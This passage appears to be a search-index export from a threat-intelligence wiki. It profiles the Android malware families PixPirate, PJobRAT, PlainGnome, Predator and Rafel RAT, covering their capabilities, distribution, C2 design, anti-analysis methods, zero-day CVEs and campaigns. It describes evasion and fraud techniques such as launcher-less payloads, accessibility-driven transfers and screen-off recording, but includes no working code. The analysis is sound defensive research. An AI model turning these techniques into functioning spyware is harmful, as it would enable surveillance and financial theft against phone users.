receivers.</p>"},{"location":"malware/families/pixpirate/#whatsapp-propagation","title":"WhatsApp Propagation","text":"<p>In later campaigns, IBM documented PixPirate spreading via WhatsApp. The payload uses accessibility capabilities to:</p> <ol> <li>Read the victim's WhatsApp contact list</li> <li>Send phishing messages with the dropper download link to contacts</li> <li>Propagate automatically without operator intervention</li> </ol> <p>This adds a worm-like dimension similar to FluBot's SMS propagation, but using WhatsApp as the channel instead of SMS.</p>"},{"location":"malware/families/pixpirate/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/pixpirate/#core-functions","title":"Core Functions","text":"Capability Description ATS fraud via Pix Automates Pix transfers using accessibility services to interact with banking app UI Credential theft Steals banking passwords by recognizing UI elements of targeted banks via accessibility SMS interception Reads, intercepts, and deletes SMS messages (OTP theft, evidence removal) Notification interception Monitors and suppresses notifications from banking apps Contact list access Reads contacts for WhatsApp-based propagation WhatsApp worm Sends phishing messages to contacts via WhatsApp Uninstall prevention Uses accessibility to disrupt settings navigation when user attempts removal Keylogging Records keystrokes on targeted apps Screen recording Captures screen content for operator review Remote control RAT functionality for manual operator intervention"},{"location":"malware/families/pixpirate/#ats-fraud-detail","title":"ATS Fraud Detail","text":"<p>PixPirate's ATS implementation is bank-specific. The malware includes JavaScript modules with functions tailored to each targeted bank's Pix transfer UI:</p> <pre><code>Victim opens banking app\n    \u2192 Accessibility service detects target bank's activity\n    \u2192 PixPirate identifies UI elements (password field, transfer buttons, amount fields)\n    \u2192 Injects credentials if needed (from prior theft)\n    \u2192 Navigates to Pix transfer flow\n    \u2192 Fills recipient details (mule account controlled by operators)\n    \u2192 Sets transfer amount\n    \u2192 Confirms transaction\n    \u2192 Clears notification evidence\n</code></pre> <p>Each bank has a dedicated function because Pix transfer UIs differ between banking apps. The malware recognizes specific view hierarchies, button labels, and field identifiers per bank.</p>"},{"location":"malware/families/pixpirate/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/pixpirate/#architecture","title":"Architecture","text":"<pre><code>Dropper APK (visible, has launcher icon)\n    \u2192 Downloads/unpacks Payload APK\n    \u2192 Requests Accessibility Service permission via persistent pop-ups\n    \u2192 Binds to Payload's exported service to trigger activation\n    \u2192 Can be safely uninstalled by user (payload survives)\n\nPayload APK (invisible, no launcher icon)\n    \u2192 No android.intent.action.MAIN\n    \u2192 No android.intent.category.LAUNCHER\n    \u2192 Exports a Service for dropper binding\n    \u2192 Registers BroadcastReceivers for:\n        - BOOT_COMPLETED\n        - CONNECTIVITY_CHANGE\n        - PACKAGE_REPLACED\n    \u2192 Persists independently of dropper\n</code></pre>"},{"location":"malware/families/pixpirate/#icon-hiding-technique","title":"Icon Hiding Technique","text":"<p>Prior to PixPirate, Android malware hid launcher icons by calling <code>setComponentEnabledSetting()</code> to disable the launcher activity after installation. Android 10 blocked this approach. PixPirate bypasses the restriction entirely by never declaring a launcher activity in the first place. The manifest contains no activity with <code>MAIN</code> + <code>LAUNCHER</code> intent filters, so the system never creates an icon. Activation is handled through the exported service and broadcast receivers.</p>"},{"location":"malware/families/pixpirate/#c2-communication","title":"C2 Communication","text":"Parameter Details Protocol HTTP Data format JSON TLS Certificate pinning to prevent MITM inspection Commands Transfer instructions, mule account details, target bank configurations, module updates <p>Cleafy noted the use of certificate pinning on C2 communications, which prevents traffic interception even on devices with user-installed CA certificates. The C2 delivers configuration updates including new bank-specific JavaScript modules and mule account rotation.</p>"},{"location":"malware/families/pixpirate/#anti-analysis","title":"Anti-Analysis","text":"Technique Description Code obfuscation Heavy obfuscation with garbage functions requiring multiple deobfuscation passes String encryption Encrypted strings decrypted at runtime No launcher icon Invisible to standard device inspection Certificate pinning Prevents C2 traffic interception Anti-emulator Checks for emulator artifacts Anti-debugging Detects debugging tools"},{"location":"malware/families/pixpirate/#accessibility-abuse","title":"Accessibility Abuse","text":"<p>PixPirate requests accessibility permissions through persistent fake pop-ups that reappear until the victim grants access. Once enabled, the accessibility service provides:</p> <ul> <li>Real-time monitoring of foreground activities (for trigger detection)</li> <li>UI element inspection (for ATS automation)</li> <li>Click and gesture injection (for performing transfers)</li> <li>Notification access (for OTP interception and suppression)</li> <li>Keylogging (for credential capture)</li> </ul>"},{"location":"malware/families/pixpirate/#target-regions","title":"Target Regions","text":"Region Status Notes Brazil Primary target All known bank-specific modules target Brazilian financial institutions via Pix India Expanding IBM documented WhatsApp-based campaigns targeting Indian users Italy Early stage IBM identified initial campaigns Mexico Early stage IBM identified initial campaigns <p>The expansion beyond Brazil is significant. While Pix is Brazil-specific, the malware's ATS capabilities and WhatsApp propagation mechanism are adaptable to other instant payment platforms and banking apps.</p>"},{"location":"malware/families/pixpirate/#notable-campaigns","title":"Notable Campaigns","text":"<p>2022, Late: PixPirate first observed in the wild targeting Brazilian banking users. Distributed via smishing campaigns directing victims to download a fake authenticator app.</p> <p>2023, February: Cleafy publishes initial analysis documenting PixPirate's ATS capabilities against Pix, its accessibility abuse, and its dropper-based distribution. The report details the bank-specific JavaScript modules and C2 architecture.</p> <p>2024, February: IBM Security Trusteer publishes detailed analysis of the novel icon-hiding technique, documenting how the payload operates without a launcher activity and persists independently of the dropper. BleepingComputer, The Hacker News, and Dark Reading publish coverage highlighting this as the first financial malware to use the no-launcher-activity approach.</p> <p>2024-2025: IBM documents PixPirate's expansion via WhatsApp. The malware begins targeting users in India, Italy, and Mexico, using WhatsApp spam from infected devices to spread the dropper. The WhatsApp propagation mechanism gives the campaign worm-like characteristics similar to FluBot's SMS spreading.</p>"},{"location":"malware/families/pjobrat/","title":"PJobRAT","text":"<p>PJobRAT is an Android RAT built for targeted espionage against military and government personnel. First documented in 2021 when it was deployed against Indian military targets through fake dating and messaging apps, the malware went quiet before Sophos X-Ops identified a retooled campaign in March 2025 that had been running from January 2023 through October 2024, this time targeting users in Taiwan. The new variant dropped the WhatsApp-scraping module from the original version and replaced it with a remote shell capability, expanding the operator's reach from predefined data theft to arbitrary command execution on the victim device. PJobRAT uses a dual-channel C2 architecture: HTTP for data exfiltration and Firebase Cloud Messaging for command dispatch.</p>"},{"location":"malware/families/pjobrat/#overview","title":"Overview","text":"Attribute Details First Seen 2021 (India campaign); January 2023 (Taiwan campaign) Last Seen October 2024 (Taiwan campaign ceased) Status Inactive (latest campaign); likely retooling Type Remote Access Trojan, espionage Attribution Unknown, possibly state-aligned; original campaign suggested Chinese or Pakistani origin Distribution Fake messaging apps hosted on WordPress sites"},{"location":"malware/families/pjobrat/#origin-and-lineage","title":"Origin and Lineage","text":"<p>PJobRAT has no known derivation from public RAT builders or leaked source code. The original 2021 variant targeted Indian military personnel through apps disguised as dating platforms (Trendbanter) and Signal clones. Cyble's initial analysis revealed the malware used BIND_ACCESSIBILITY_SERVICE to hook into WhatsApp's UI and extract contacts and messages directly. The 2021 campaign infrastructure and app distribution pointed toward actors with interest in Indian defense intelligence, with researchers suggesting Chinese or Pakistani origin.</p> <p>The 2023-2024 Taiwan campaign represents a significant retooling. Sophos documented that the new variant removed the dedicated WhatsApp-stealing module entirely, replacing it with a general-purpose shell command capability. This shift from hardcoded data targets to flexible command execution reflects an operator prioritizing adaptability over specialized collection.</p> <p>Unlike commodity RATs such as SpyNote that are openly sold and widely deployed, PJobRAT appears to be a private tool used in narrow, targeted campaigns with long operational windows.</p>"},{"location":"malware/families/pjobrat/#distribution","title":"Distribution","text":"<p>PJobRAT's Taiwan campaign distributed malware through fake instant messaging apps hosted on WordPress sites. The operator created convincing app listings rather than relying on Play Store infiltration or smishing at scale.</p> Vector Details SangaalLite Fake messaging app, name likely mimicking \"SignalLite,\" hosted on WordPress sites CChat Impersonation of a legitimate chat app with the same name, also WordPress-hosted WordPress infrastructure Multiple WordPress sites served as download portals, earliest artifact from January 2023"},{"location":"malware/families/pjobrat/#attack-flow","title":"Attack Flow","text":"<ol> <li>Target discovers a WordPress-hosted page advertising SangaalLite or CChat as a messaging app</li> <li>Target downloads and installs the APK from the WordPress site</li> <li>The app requests extensive permissions including accessibility services, battery optimization exemption, and storage access</li> <li>PJobRAT begins collecting device metadata, contacts, SMS, call logs, and location data</li> <li>Collected data is exfiltrated to the C2 server over HTTP</li> <li>The operator sends shell commands via Firebase Cloud Messaging to execute arbitrary actions</li> <li>The operator can extract files (documents, images, audio, video), scrape screen content, or pivot further into the device</li> </ol> <p>The campaign ran for nearly two years (January 2023 to October 2024) before going silent. All identified victims were located in Taiwan.</p>"},{"location":"malware/families/pjobrat/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/pjobrat/#core-features","title":"Core Features","text":"Capability Implementation Device metadata collection Harvests device model, OS version, IMEI, carrier info, and installed apps Contact exfiltration Extracts the full contact list from the device SMS theft Reads and uploads all SMS messages Call log access Collects complete call history Location tracking Captures GPS coordinates File exfiltration Uploads documents (.doc, .pdf), images, audio, and video from device and external storage Screen scraping Abuses accessibility services to read on-screen content from any app Remote shell Executes arbitrary shell commands received via FCM Background persistence Requests battery optimization exemption to maintain continuous operation"},{"location":"malware/families/pjobrat/#dual-channel-c2","title":"Dual-Channel C2","text":"<p>PJobRAT splits its C2 communication across two channels:</p> Channel Purpose HTTP Uploads stolen data (device info, SMS, contacts, files) to the C2 server Firebase Cloud Messaging Receives commands from the operator, including shell commands and exfiltration directives <p>This separation keeps command traffic within Google's legitimate FCM infrastructure, making it harder to detect at the network level. Data exfiltration flows over standard HTTP to attacker-controlled servers.</p>"},{"location":"malware/families/pjobrat/#evolution-from-2021-to-2024","title":"Evolution from 2021 to 2024","text":"Feature 2021 Version 2024 Version WhatsApp theft Dedicated module using accessibility service hooks Removed; replaced by shell command capability Shell commands Not present Full remote shell via FCM Distribution Third-party app stores, dating app lures WordPress-hosted fake messaging apps Target region India (military personnel) Taiwan C2 channels HTTP + FCM HTTP + FCM (unchanged) <p>The shell command addition is the most significant upgrade. It allows the operator to extract WhatsApp databases (or any other app data) on demand, root the device if a local privilege escalation exists, pivot to other systems on the same network, and silently uninstall the malware after objectives are met.</p>"},{"location":"malware/families/pjobrat/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/pjobrat/#permissions-abuse","title":"Permissions Abuse","text":"<p>PJobRAT requests a broad set of permissions at install time:</p> Permission Purpose BIND_ACCESSIBILITY_SERVICE Screen scraping, reading content from any visible app READ_CONTACTS, READ_SMS, READ_CALL_LOG Data collection from contacts, messages, and call history ACCESS_FINE_LOCATION GPS tracking READ_EXTERNAL_STORAGE File access on device and SD card REQUEST_IGNORE_BATTERY_OPTIMIZATIONS Persistent background execution CAMERA, RECORD_AUDIO Media capture (present in permissions manifest)"},{"location":"malware/families/pjobrat/#firebase-cloud-messaging-integration","title":"Firebase Cloud Messaging Integration","text":"<p>FCM serves as the command channel. The operator pushes commands to the infected device through Google's notification infrastructure. This approach has two tactical advantages: FCM traffic blends with normal Android push notification traffic, and the operator does not need to maintain a persistent connection to the device.</p>"},{"location":"malware/families/pjobrat/#target-regions","title":"Target Regions","text":"Region Campaign Details India 2021 Military personnel targeted via fake dating and messaging apps Taiwan 2023-2024 Users targeted via WordPress-hosted fake chat apps (SangaalLite, CChat) <p>The shift from India to Taiwan suggests either a change in operator priorities or the tool being repurposed by a different group with different intelligence requirements.</p>"},{"location":"malware/families/pjobrat/#notable-campaigns","title":"Notable Campaigns","text":"<p>2021: PJobRAT is first identified by Cyble and 360 Core Security Lab targeting Indian military personnel. The malware hides inside fake dating apps (Trendbanter) and Signal clones distributed through third-party app stores. It uses accessibility services to steal WhatsApp conversations directly from the screen.</p> <p>January 2023: A retooled PJobRAT variant appears on WordPress-hosted sites offering SangaalLite and CChat downloads. The campaign targets Taiwanese users with a new version that replaces WhatsApp-specific theft with general shell command execution.</p> <p>October 2024: The Taiwan campaign goes silent. No new samples or active C2 infrastructure are detected after this point.</p> <p>March 2025: Sophos X-Ops publishes the full analysis of the Taiwan campaign, detailing the dual-channel C2 architecture, shell command capabilities, and WordPress-based distribution.</p>"},{"location":"malware/families/pjobrat/#related-families","title":"Related Families","text":"<p>PJobRAT occupies a niche similar to other targeted espionage tools rather than the commodity banking trojan ecosystem. Its closest functional parallels are state-aligned surveillance families like Pegasus and Predator, though PJobRAT operates at a far lower level of sophistication, requiring social engineering for installation rather than exploit chains.</p> <p>The use of accessibility services for data scraping mirrors techniques found across the Android malware landscape, from banking trojans like Hook and Octo to other RATs like SpyNote. The difference is intent: where banking trojans use accessibility to perform overlay attacks and credential theft, PJobRAT uses it purely for intelligence collection.</p> <p>PJobRAT's FCM-based command channel is a pattern also seen in SpyNote and other Android RATs, where leveraging Google infrastructure for C2 provides both reliability and network-level stealth.</p>"},{"location":"malware/families/plaingnome/","title":"PlainGnome","text":"<p>PlainGnome is a custom-built Android surveillanceware family discovered by Lookout in December 2024, initially attributed to Gamaredon (Primitive Bear/Shuckworm, an FSB-linked APT group) and later reattributed to Sandcat, an Uzbekistan-based threat actor associated with Uzbekistan's State Security Service (SSS). Unlike its companion family BoneSpy, PlainGnome is not derived from existing open-source surveillance code. It is a purpose-built tool with a two-stage deployment architecture: a minimal first-stage dropper installs a second-stage surveillance payload stored within the dropper package. PlainGnome performs emulator detection before deploying the second stage, and exfiltrates data only when the device enters an idle state using Android's Jetpack WorkManager. A stealth-optimized audio recording mode activates only when the device screen is off, avoiding the microphone indicator that newer Android versions display in the status bar. Active since 2024, PlainGnome targets Russian-speaking victims in Central Asian former Soviet states.</p>"},{"location":"malware/families/plaingnome/#quick-reference","title":"Quick Reference","text":"Attribute Details First Seen 2024 Last Seen Active as of December 2024 Status Active Type Surveillanceware Attribution Originally Gamaredon (FSB-linked); reattributed to Sandcat (Uzbekistan SSS) Aliases None known Lineage Custom-built, no known open-source foundation Distribution Social engineering, fake utility apps Related BoneSpy (companion family by same operator)"},{"location":"malware/families/plaingnome/#capabilities","title":"Capabilities","text":"Capability Details SMS collection Harvests all SMS messages Call logs Extracts call history Phone call audio Records voice calls Contacts Exfiltrates device contact list GPS location Tracks device coordinates Camera capture Takes photos via device cameras Ambient audio Records microphone audio with screen-off stealth mode Browser history Collects browsing data Notifications Intercepts and reads notifications Screenshots Captures device screen Cellular provider info Collects SIM and carrier details File access Browses and exfiltrates files from storage"},{"location":"malware/families/plaingnome/#screen-off-audio-recording","title":"Screen-Off Audio Recording","text":"<p>PlainGnome implements two ambient audio recording modes:</p> <ol> <li>Screen-off only - recording automatically stops when the device screen activates</li> <li>Continuous - records regardless of screen state</li> </ol> <p>The screen-off mode exists because Android 12 and later display a microphone icon in the status bar when any application accesses the microphone. By restricting recording to periods when the screen is off, the operator avoids the indicator being visible to the device owner. This represents a direct adaptation to Android's privacy transparency features.</p>"},{"location":"malware/families/plaingnome/#idle-state-exfiltration","title":"Idle-State Exfiltration","text":"<p>PlainGnome uses Android's Jetpack WorkManager API to schedule data exfiltration only when the device enters an idle state. This reduces network activity during periods of active user engagement, lowering the chance of the victim noticing unusual battery drain or data usage associated with upload operations.</p>"},{"location":"malware/families/plaingnome/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/plaingnome/#two-stage-dropper-architecture","title":"Two-Stage Dropper Architecture","text":"<p>PlainGnome's deployment separates the dropper from the surveillance payload:</p> Stage Role First stage (dropper) Minimal APK that presents itself as a utility app; requests <code>REQUEST_INSTALL_PACKAGES</code> permission; deploys second stage Second stage (payload) Full surveillance module stored within the dropper package; installed after anti-analysis checks pass <p>This two-stage design offers operational advantages over BoneSpy's single-stage approach. The dropper can present a benign appearance during initial analysis, and the surveillance payload is only deployed after the environment has been validated. If the dropper detects an emulator or analysis sandbox, it never drops the payload, shielding the actual surveillance capabilities from researcher inspection.</p>"},{"location":"malware/families/plaingnome/#emulator-detection","title":"Emulator Detection","text":"<p>Before deploying the second-stage payload, PlainGnome checks whether it is running on an emulator. This targets automated analysis sandboxes and manual researcher environments. If emulation is detected, the dropper does not install the surveillance module, preventing capability exposure in controlled analysis settings.</p>"},{"location":"malware/families/plaingnome/#no-code-obfuscation","title":"No Code Obfuscation","text":"<p>Despite the sophistication of its two-stage architecture and anti-analysis checks, PlainGnome does not employ code obfuscation. Once a researcher obtains the second-stage payload (by running the dropper on a physical device or bypassing emulator detection), the surveillance code is fully readable, a notable gap in the tool's operational security.</p>"},{"location":"malware/families/plaingnome/#custom-codebase","title":"Custom Codebase","text":"<p>PlainGnome does not share code lineage with DroidWatcher or any other known open-source surveillance project. While it implements a similar capability set to BoneSpy, the implementation is original. This likely reflects an intentional progression by the operators: BoneSpy served as the initial capability (leveraging existing code for rapid deployment), while PlainGnome represents a custom follow-on tool built to address the limitations of using a known open-source codebase.</p>"},{"location":"malware/families/plaingnome/#distribution","title":"Distribution","text":"<p>PlainGnome has never been observed on Google Play. Distribution is suspected to involve targeted social engineering, with lures including:</p> Lure Type Details Battery charge monitoring Fake utility apps for battery management Photo gallery apps Disguised as photo gallery applications Fake Samsung Knox Impersonates Samsung's enterprise security platform Trojanized Telegram Fully functional Telegram app bundled with surveillance capabilities <p>The exact delivery mechanism (phishing links, direct messages, watering holes) remains unclear. The targeting of Russian-speaking populations in Central Asia suggests distribution through Russian-language social channels and messaging platforms.</p>"},{"location":"malware/families/plaingnome/#target-regions","title":"Target Regions","text":"Region Details Uzbekistan Primary target Kazakhstan Secondary target Tajikistan Secondary target Kyrgyzstan Secondary target <p>The targeting mirrors BoneSpy's victim profile: Russian-speaking individuals in Central Asian former Soviet states. Given the reattribution to Sandcat (Uzbekistan SSS), this targeting pattern aligns with Uzbekistan's intelligence priorities in its immediate neighborhood.</p>"},{"location":"malware/families/plaingnome/#attribution","title":"Attribution","text":"<p>Lookout initially attributed PlainGnome to Gamaredon based on dynamic DNS provider usage and IP address overlaps with known Gamaredon desktop campaign infrastructure. This was later corrected to Sandcat, a threat actor linked to Uzbekistan's State Security Service, first identified in 2019. The reattribution reflects additional evidence that distinguished the mobile campaign infrastructure from Gamaredon's operations. The operational pairing of PlainGnome with BoneSpy under a single threat actor demonstrates a clear evolution in mobile surveillance capability: from an open-source foundation (BoneSpy/DroidWatcher) to a custom-built tool (PlainGnome) with anti-analysis protections and stealth optimizations.</p>"},{"location":"malware/families/plaingnome/#related-families","title":"Related Families","text":"Family Relationship BoneSpy Companion family by the same operator. BoneSpy is derived from DroidWatcher and uses a single-stage architecture. PlainGnome is custom-built with a two-stage dropper and more advanced anti-analysis features. Both share the same targeting profile and operator. GuardZoo Both are state-linked mobile surveillance tools targeting specific regional populations. GuardZoo targets Middle Eastern military personnel for Houthi-aligned intelligence, while PlainGnome targets Central Asian civilians and government figures for Uzbekistan's SSS. Both operate through social engineering rather than exploit chains. KoSpy Both use anti-analysis measures (emulator detection) and target specific language communities. KoSpy uses a Firebase Firestore first-stage for C2 configuration delivery, while PlainGnome uses a dropper APK for staged deployment. Both were disclosed by Lookout."},{"location":"malware/families/plaingnome/#references","title":"References","text":"<ul> <li>Lookout: BoneSpy and PlainGnome Android Surveillance</li> <li>The Hacker News: Gamaredon Deploys Android Spyware BoneSpy and PlainGnome</li> <li>BleepingComputer: Russian cyberspies target Android users with new spyware</li> <li>Security Affairs: First mobile malware families linked to Gamaredon</li> <li>SecurityOnline: Gamaredon APT Deploys Two Russian Android Spyware Families</li> <li>Infosecurity Magazine: Lookout Discovers New Spyware Deployed by Russia and China</li> </ul>"},{"location":"malware/families/predator/","title":"Predator","text":"<p>Predator is a mercenary spyware platform developed by Cytrox and operated under the Intellexa alliance, a consortium of European surveillance companies assembled to compete with NSO Group. Unlike Pegasus, which relies on proprietary zero-click exploits, Predator is typically delivered through one-click exploit chains targeting Chrome and Android kernel vulnerabilities. Its architecture splits responsibilities between an initial loader called Alien and the main implant Predator, which runs a Python-based module system for flexible surveillance tasking. Predator has been deployed against journalists, politicians, and academics across at least 25 countries.</p>"},{"location":"malware/families/predator/#overview","title":"Overview","text":"Attribute Details First Seen 2019 (estimated development start), December 2021 (first public documentation) Status Active, despite U.S. sanctions on Intellexa Type Commercial spyware (government-exclusive) Attribution Cytrox (North Macedonia), part of the Intellexa alliance led by Tal Dilian Aliases Predator, PREDATOR (Talos convention) Loader Alien Platforms Android (primary), iOS"},{"location":"malware/families/predator/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Cytrox was founded in North Macedonia and later acquired into the Intellexa alliance, a group of companies including Nexa Technologies (formerly Amesys, France), WiSpear/Passitora Ltd. (Cyprus), and Senpai Technologies (Israel). Tal Dilian, an ex-Israeli Defense Forces intelligence officer, assembled this consortium with the explicit goal of building an EU-regulated competitor to NSO Group.</p> <p>Citizen Lab first publicly documented Predator in December 2021 when they discovered it on the iPhone of Ayman Nour, an Egyptian opposition politician living in exile in Turkey. Notably, Nour's device was infected with both Pegasus and Predator simultaneously by two separate government clients, making it the first known case of dual commercial spyware infection.</p>"},{"location":"malware/families/predator/#distribution","title":"Distribution","text":"<p>Predator delivery relies on one-click exploit chains and social engineering rather than zero-click capabilities.</p>"},{"location":"malware/families/predator/#exploit-chain-delivery","title":"Exploit Chain Delivery","text":"<p>Google TAG documented three campaigns in May 2022 where Predator was deployed using five zero-day vulnerabilities:</p> CVE Component Type CVE-2021-37973 Chrome (use-after-free in Portals) 0-day CVE-2021-37976 Chrome (info leak in core) 0-day CVE-2021-38000 Chrome (insufficient validation in Intents) 0-day CVE-2021-38003 Chrome (type confusion in V8) 0-day CVE-2021-1048 Android kernel (use-after-free) 0-day <p>The attack flow:</p> <ol> <li>Target receives a spear-phishing email containing a one-time link disguised as a URL shortener</li> <li>Clicking redirects through the exploit server, which chains Chrome RCE with an Android kernel privilege escalation</li> <li>The Alien loader is dropped onto the device</li> <li>Alien downloads and executes the Predator implant</li> <li>The target is redirected to a legitimate website to avoid suspicion</li> </ol> <p>Google TAG noted that these campaigns targeted tens of users per operation across Egypt, Armenia, Greece, Madagascar, Indonesia, Serbia, and Spain. The exploit chains also used n-day exploits alongside zero-days, exploiting the gap between when patches are released and when they reach end-user devices.</p>"},{"location":"malware/families/predator/#one-click-link-delivery","title":"One-Click Link Delivery","text":"<p>In the Greek surveillance scandal, targets received links via SMS or messaging apps that led to exploit pages. Citizen Lab confirmed Predator infections on the devices of journalist Thanasis Koukakis and PASOK party leader Nikos Androulakis. In some cases, links were distributed through social media, including posts on Twitter/X containing malicious URLs.</p>"},{"location":"malware/families/predator/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/predator/#alien-loader","title":"Alien Loader","text":"<p>Alien is far more than a simple dropper. Cisco Talos published an in-depth technical analysis revealing that Alien provides foundational capabilities that Predator depends on:</p> Capability Implementation Process injection Loaded into the <code>zygote64</code> process, giving it access to every Android application IPC hooking Hooks <code>ioctl()</code> in <code>libbinder.so</code> to intercept inter-process communication across the Android framework SELinux bypass Operates within the privileged <code>zygote</code> SELinux context Module delivery Downloads and loads Predator and additional modules from C2 Audio recording Low-level audio capture implemented at the Alien layer"},{"location":"malware/families/predator/#predator-implant","title":"Predator Implant","text":"<p>Predator itself runs a Python runtime environment, making it highly modular. New surveillance capabilities can be deployed as Python modules without requiring re-exploitation of the target device.</p> Capability Details Call recording Record voice calls and VoIP conversations Messaging app access Extract data from WhatsApp, Signal, Telegram Camera Activate front and rear cameras Microphone Ambient audio recording Location GPS and network-based tracking Certificate injection Install custom CA certificates into the user trust store, enabling MITM of TLS traffic App hiding Conceal applications or prevent their execution Arbitrary code execution Load and execute Python modules on demand from C2"},{"location":"malware/families/predator/#unknown-modules","title":"Unknown Modules","text":"<p>Talos identified references to two modules they could not obtain for analysis:</p> Module Suspected Function <code>tcore</code> Main surveillance orchestration component <code>kmem</code> Kernel memory access for privilege escalation"},{"location":"malware/families/predator/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/predator/#architecture","title":"Architecture","text":"<p>The Alien + Predator split serves an operational purpose: Alien handles the low-level Android integration (process injection, IPC hooking, SELinux context), while Predator provides the high-level surveillance logic through Python. This separation means Alien needs to be tightly coupled to the target Android version, while Predator modules remain portable.</p>"},{"location":"malware/families/predator/#persistence","title":"Persistence","text":"<p>Predator achieves persistence through Alien's injection into <code>zygote64</code>. Since Zygote is the parent process from which all Android applications fork, Alien persists as long as the system is running. On reboot, the persistence mechanism reinstalls the loader.</p>"},{"location":"malware/families/predator/#tls-interception","title":"TLS Interception","text":"<p>One of Predator's more aggressive capabilities is certificate poisoning. By injecting custom CA certificates into the user certificate store, Predator can perform man-in-the-middle attacks on HTTPS connections. This allows the operator to intercept encrypted communications from apps that do not implement certificate pinning.</p>"},{"location":"malware/families/predator/#c2-communication","title":"C2 Communication","text":"<p>Predator uses HTTPS for C2 communication with multi-hop proxy infrastructure. Citizen Lab mapped suspected Predator C2 servers to operators in Armenia, Egypt, Greece, Indonesia, Madagascar, Oman, Saudi Arabia, and Serbia.</p>"},{"location":"malware/families/predator/#known-deployments-and-targets","title":"Known Deployments and Targets","text":"Country Targets Source Egypt Ayman Nour (opposition politician), exiled journalist Citizen Lab, December 2021 Greece Journalist Thanasis Koukakis, PASOK leader Nikos Androulakis, other politicians CPJ, Citizen Lab Armenia Government-backed campaigns Google TAG Indonesia Government-backed campaigns Google TAG Madagascar Political targets Google TAG Serbia Journalists, civil society Google TAG Spain Political figures Google TAG United States U.S. Senator and Congressman (targeted via social media links) Citizen Lab, October 2023 European Union President of European Parliament, MEPs Citizen Lab, October 2023 Vietnam, Qatar, Congo, Kenya, and others Various Amnesty International Predator Files"},{"location":"malware/families/predator/#notable-campaigns-and-discoveries","title":"Notable Campaigns and Discoveries","text":"<p>December 2021: Citizen Lab publishes \"Pegasus vs. Predator\", the first public documentation of Predator. The report identifies Cytrox as the developer and reveals that Egyptian opposition figure Ayman Nour's phone was simultaneously infected with both Pegasus and Predator.</p> <p>May 2022: Google TAG reveals that Cytrox exploited five zero-day vulnerabilities (four in Chrome, one in Android kernel) across three campaigns targeting Android users in multiple countries. TAG attributes the exploit packaging to Cytrox. Project Zero's 2021 zero-day trend analysis noted a record 58 in-the-wild zero-days detected that year, with Cytrox/Predator attributed for five Android and Chrome zero-days.</p> <p>April 2022: CPJ reports that Greek journalist Thanasis Koukakis was surveilled with Predator from July to September 2021. The revelations trigger a political crisis in Greece, leading to the resignations of the Greek intelligence chief and the prime minister's chief of staff in August 2022.</p> <p>May 2023: Cisco Talos publishes \"Mercenary Mayhem\", the most detailed technical analysis of Predator and Alien to date. The report reveals the Python-based architecture, Zygote injection, IPC hooking, and TLS interception capabilities. Talos also publishes a companion piece mapping the Intellexa corporate structure.</p> <p>October 2023: The Predator Files investigation, a year-long collaboration between Amnesty International and European Investigative Collaborations (EIC), reveals that 25 countries purchased Intellexa products. Citizen Lab independently confirms Predator targeting of U.S. and EU elected officials and journalists through links distributed on Twitter/X.</p> <p>March 2024: The U.S. Treasury Department sanctions Intellexa and its founder Tal Dilian, along with associated entities, for developing and distributing commercial spyware used against Americans. Despite sanctions, reports indicate Intellexa continues to operate through restructured corporate entities.</p>"},{"location":"malware/families/rafelrat/","title":"Rafel RAT","text":"<p>Rafel RAT is an open-source Android remote access trojan documented by Check Point Research in June 2024 after observing over 120 distinct campaigns leveraging the tool across multiple countries. Originally built for espionage, Rafel RAT has been adopted by a wide range of threat actors, from state-sponsored groups like APT-C-35 (DoNot Team) to financially motivated operators deploying its ransomware module. Its open-source availability, PHP-based C2 panel, and broad feature set covering data exfiltration, SMS theft, location tracking, file encryption, and device wiping make it one of the most widely deployed Android RATs in recent years.</p>"},{"location":"malware/families/rafelrat/#overview","title":"Overview","text":"Attribute Details First Seen Campaigns observed over approximately two years prior to June 2024 disclosure Status Active, open-source and widely available Type Remote access trojan, espionage, ransomware Attribution Multiple actors; notably APT-C-35 (DoNot Team) Distribution Social engineering, phishing via SMS/WhatsApp/Telegram, fake app lures"},{"location":"malware/families/rafelrat/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Rafel RAT is an open-source tool, meaning its source code is freely available for any threat actor to modify and deploy. This accessibility has driven its adoption across a broad spectrum of operators, from sophisticated espionage groups to opportunistic cybercriminals. Check Point Research collected samples and identified around 120 C2 servers supporting campaigns spanning approximately two years.</p> <p>The tool's open-source nature means individual campaigns vary significantly in sophistication, targeting, and objectives. Some operators use Rafel RAT as a straightforward data exfiltration tool, while others have leveraged its ransomware module for extortion. APT-C-35 (DoNot Team), a South Asian threat group known for espionage operations, was identified by Check Point as one of the actors deploying Rafel RAT, demonstrating its appeal even to groups capable of developing custom tooling.</p>"},{"location":"malware/families/rafelrat/#distribution","title":"Distribution","text":"<p>Rafel RAT relies on social engineering to reach victims. The malware impersonates widely recognized applications including Instagram, WhatsApp, e-commerce platforms, antivirus programs, and device support apps. Operators distribute malicious APKs through phishing campaigns on WhatsApp, Telegram, and SMS, directing victims to download and install the fake application.</p> Vector Details Fake applications Disguised as Instagram, WhatsApp, e-commerce apps, antivirus tools, support utilities Phishing messages Distributed via SMS, WhatsApp, and Telegram with links to malicious APKs Social engineering Victims manipulated into granting intrusive permissions post-installation <p>Over 87.5% of infected devices were running outdated Android versions that no longer receive security patches, indicating that operators specifically benefit from the weakened security posture of end-of-life devices. Samsung devices comprised the largest share of victims, followed by Xiaomi, Vivo, and Huawei handsets.</p>"},{"location":"malware/families/rafelrat/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/rafelrat/#core-features","title":"Core Features","text":"Capability Implementation SMS theft Exfiltrates all SMS messages including 2FA codes via <code>sms_oku</code> command Location tracking Continuous device location reporting via <code>location_tracker</code> command Contact exfiltration Harvests the victim's full phone book Call log theft Extracts and exfiltrates call history Device info collection Gathers identifiers, locale, carrier, model, root status Installed app enumeration Lists all applications installed on the device File exfiltration Steals files from device storage Notification siphoning Intercepts and forwards notifications, capturing authentication codes SD card wipe Destructive capability to erase external storage Call log deletion Removes call history to cover tracks Ransomware AES encryption of files with lock screen manipulation Wallpaper manipulation Changes device wallpaper to display ransom 